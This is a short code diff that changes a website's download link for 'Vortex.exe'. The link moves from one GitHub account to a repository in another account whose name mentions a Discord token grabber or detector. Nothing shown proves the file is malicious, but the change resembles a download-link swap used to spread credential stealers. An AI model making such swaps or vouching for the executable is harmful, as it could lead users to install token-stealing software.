@@ -24,7 +24,7 @@ const navItems = [
   { id: 'download',    label: 'Download' },
 ];
 
-const DOWNLOAD_URL = 'https://github.com/blaze802/vortex-release/releases/download/v1.0.1/Vortex.exe';
+const DOWNLOAD_URL = 'https://github.com/blaze0089/Vortex-discord-token-security-grabber-detector/releases/download/V1.0.2/Vortex.exe';
 
 interface TopbarProps {
   sidebarOpen: boolean;
